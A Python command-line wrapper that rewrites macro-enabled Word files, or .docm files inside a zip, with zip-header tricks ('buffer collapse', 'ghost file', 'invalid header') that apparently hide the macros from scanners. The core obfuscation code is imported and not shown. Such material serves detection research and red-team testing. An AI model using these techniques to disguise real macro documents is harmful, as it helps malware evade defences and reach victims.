#!/usr/bin/env python3

"""Obfuscate a macro-containing Word doc (optionally within a .zip file)
 using "File Buffer Collapsing", "Ghost File", or "Invalid Header" techniques

https://arielkoren.com/blog/2020/12/24/forging-malicious-doc/
"""

import sys
import os
import zipfile
from utilities.obfuscator import Obfuscator

def obfuscate_file(in_file, technique):
    """Obfuscate a given file with the specified technique

    The obfuscated output will be written to disk with its same filename.

    If the file to be obfuscated is a .docm, obfuscation will be performed on it directly.
    If it is a .zip containing .docm files, then a zip will be output containing all of the original files, with
    all of the .docm files obfuscated.

    """

    # If file is .docm, perform obfuscation directly
    if in_file[-5:] == '.docm':
        docm = Obfuscator(in_file)
        obfuscated = docm.get_obfuscated(technique)
        with open(in_file, 'wb') as f:
            f.write(bytearray(obfuscated))

    # If file is .zip, extract and perform obfuscation on each .docm
    else:
        z = zipfile.ZipFile(in_file, "r")
        filenames = z.namelist()
        for filename in filenames:
            z.extract(filename)
            if '.docm' in filename:
                ob_m = Obfuscator(filename)
                os.remove(filename)
                obfuscated = ob_m.get_obfuscated(technique)
                with open(filename, 'wb') as f:
                    f.write(bytearray(obfuscated))
        z.close()
        os.remove(in_file)
        zw = zipfile.ZipFile(in_file, "w")
        for filename in filenames:
            zw.write(filename)
        zw.close()
        for filename in filenames:
            os.remove(filename)


def main(argv):
    usage = '''usage: obfuscate_file.py <in_file> <obfuscation_technique>
       obfuscate_file.py unmodified.zip buffer_collapse

in_file                The file to obfuscate. Can be a macro-embedded Word doc (.docm), or a .zip file
                       containing one or more .docm

obfuscation_technique  Obfuscation technique to use

                       buffer_collapse      "File Buffer Collapse" - Macro's Local File Header is embedded  
                                             in compressed zip section of another Local File Header
                       ghost_file           "Ghost File" - Local File Header for macro included without corresponding
                                             Central Directory File Header
                       invalid_header       "Invalid File Header" - Local File Header for macro is corrupted with
                                             invalid CRC-32
                       invalid_plus_buffer  "Invalid File Header" applied, followed by "File Buffer Collapse"
                       invalid_plus_ghost   "Invalid File Header" applied, followed by "Ghost File"
    
    '''

    if len(argv) < 2 or len(argv) > 3:
        print(usage)
        sys.exit(2)
    if len(argv) == 2 and (argv[1] == '-h' or argv[1] == '--help'):
        print(usage)
        sys.exit(2)

    in_file = argv[1]
    if in_file[-5:] != '.docm' and in_file[-4:] != '.zip':
        print('input must be .docm or .zip')
        sys.exit(2)

    if len(argv) > 2:
        technique = argv[2]
    else:
        technique = 'buffer_collapse'

    obfuscate_file(in_file, technique)


if __name__ == "__main__":
    main(sys.argv)

